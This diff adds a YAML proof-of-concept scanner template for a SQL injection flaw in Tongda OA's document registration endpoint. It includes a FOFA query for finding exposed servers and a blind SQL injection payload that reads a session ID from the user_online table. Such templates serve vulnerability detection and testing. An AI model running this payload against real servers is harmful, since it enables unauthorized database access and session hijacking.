@@ -1,0 +1,20 @@
+id: poc-yaml-tongda-oa-insert-sqli
+info:
+  name: 通达OA insert SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 通达OA
+  fofa: app="TDXK-通达OA"
+requests:
+- method: POST
+  path: /general/document/index.php/recv/register/insert
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: title)values("'"^exp(if(ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/0,1),8,1))<66,1,710)))#
+    =1&_SERVER=
+  expression: status_code == 302 && contains(headers,"recv/register/register_for/?rid=")
+    && body == ""
+variables: {}
+transport: http
